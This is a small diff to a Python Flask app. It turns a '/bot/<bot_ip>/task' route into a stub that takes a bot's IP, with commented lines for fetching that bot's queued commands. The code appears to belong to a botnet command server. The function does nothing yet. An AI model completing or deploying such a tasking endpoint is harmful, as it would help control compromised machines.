@@ -184,9 +184,12 @@ def register():
     except Exception as e:
         return '' 
 
-# TODO: Change this to POST, and add botkey for "authentication" <-- lmao 
+# TODO: Change this to POST, and add botkey for "authentication" <-- lmao
+# TODO: Implement this API endpoint  
 @app.route('/bot/<bot_ip>/task', methods=['GET'])
-def bottask():
+def bottask(bot_ip):
+    #query_bot = Bot.query.filter_by(ip=bot_ip).first()
+    #cmd = query_bot.cmds
     pass
 
 
